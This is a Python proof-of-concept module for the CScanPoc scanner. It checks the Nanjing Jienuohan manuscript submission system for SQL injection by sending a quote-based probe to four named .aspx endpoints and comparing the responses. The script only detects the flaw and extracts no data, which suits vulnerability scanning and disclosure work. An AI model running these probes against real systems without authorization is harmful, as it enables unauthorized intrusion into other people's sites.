# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType

class Vuln(ABVuln):
    vuln_id = 'Jienuohan_0002' # 平台漏洞编号，留空
    name = '南京杰诺瀚投稿系统 通用型SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2014-11-20'  # 漏洞公布时间
    desc = '''
        南京杰诺瀚投稿系统，
        /CommonPage.aspx
        /web/ViewAbstract.aspx
        /Tougao/UserEdit.aspx
        /tougao/GetInfo.aspx
        存在SQL注入漏洞。
    '''  # 漏洞描述
    ref = 'Unkonwn'  # 漏洞来源
    cnvd_id = 'Unkonwn'  # cnvd漏洞编号
    cve_id = 'Unkonwn'  # cve编号
    product = '杰诺瀚投稿系统'  # 漏洞应用名称
    product_version = '南京杰诺瀚投稿系统'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = '55c1a3c3-6d90-4921-ac65-5b113998333e'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-10'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            
            #refer:http://www.wooyun.org/bugs/wooyun-2010-080467
            #refer:http://www.wooyun.org/bugs/wooyun-2010-083812
            #refer:http://www.wooyun.org/bugs/wooyun-2010-083817
            #refer:http://www.wooyun.org/bugs/wooyun-2010-083852
            payloads = [
                '/CommonPage.aspx?Id=13',
                '/web/ViewAbstract.aspx?GaoHao=1',
                '/Tougao/UserEdit.aspx?IsAdd=1&type=1&IsTop=1',
                '/tougao/GetInfo.aspx?type=getwkqi&value=1',
            ]
            getdata = '%27%'
            for payload in payloads:
                verify_url = self.target + payload
                #code1, head, res1, errcode, _ = curl.curl2(url)
                #code2, head, res2, errcode, _ = curl.curl2(url+'%27')
                r1 = requests.get(verify_url)
                r2 = requests.get(verify_url + getdata)
                if r1.status_code == 200 and r2.status_code == 200 and (r2.content != r1.content):
                    #security_hole(arg+payload+": found sql Injection")
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()

if __name__ == '__main__':
    Poc().run()
